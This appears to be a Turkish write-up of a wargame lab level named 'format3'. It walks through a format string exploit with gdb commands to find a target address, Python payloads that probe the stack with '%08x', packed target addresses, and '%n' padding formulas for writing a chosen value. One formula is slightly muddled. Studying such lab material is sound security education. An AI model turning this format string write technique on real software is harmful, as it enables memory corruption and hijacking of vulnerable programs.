1- target değişkeninin adresi 0X80496f4 olarak bulunmuştur.(Bu adrese 0x01025544 değeri yazılacaktır)

    $gdb -q format3
    (gdb)disas main
    (gdb)x target

2- Verilen stringi yazdırırken kaç tane %x' den sonra yığındaki değerleri yazdırmaya başladığı bulunmuştur.(12. %x'de
yığından değerler çekmeye başlamıştır. Yani 11 tane %x den sonra %n koyarak hafızaya yazma işlemi yapılabilir)

    $python -c "print 'AAAA' + '%08x'*15"
    $python -c "print 'AAAA' + '%08x'*11 + '%08x'"
    
3- Yazma işlemi target adresinin en anlamsız byte'ından başlayarak her 4 byte'ı için ayrı ayrı yapılmıştır. Yazılacak değer
ise endüşük anlamdan başlamak üzere aşağıdaki gibi 4 kısma bölünmüştür. 

    target1 = '\xf4\x96\x04\x08AAAA'
    target2 = '\xf5\x96\x04\x08AAAA'
    target3 = '\xf6\x96\x04\x08AAAA'
    target4 = '\xf7\x96\x04\x08AAAA'
   
4- Her %n kullanılmadan önce yazılacak değer bir önceki %x'de ayarlanmış ve her seferinde bir byte yazılmıştır.Ayarlama şu
şekilde gerçekleşmiştir.

    n1 = 256 + n1 = 256 + byte1 - 0x70               # 0x70 değeri hiç bir değişiklik yapmadan ilk %n de çıkacak değerdir.
    n2 = 256*2 + byte2 - n1 - 0x70                   # önceki yazılan byteların toplamı şeklindede bulunabilir.
    n3 = 256*3 + byte3 - n2 - n1 - 0x70
    n4 = 256*4 + byte4 - n3 - n2 - n1 - 0x70
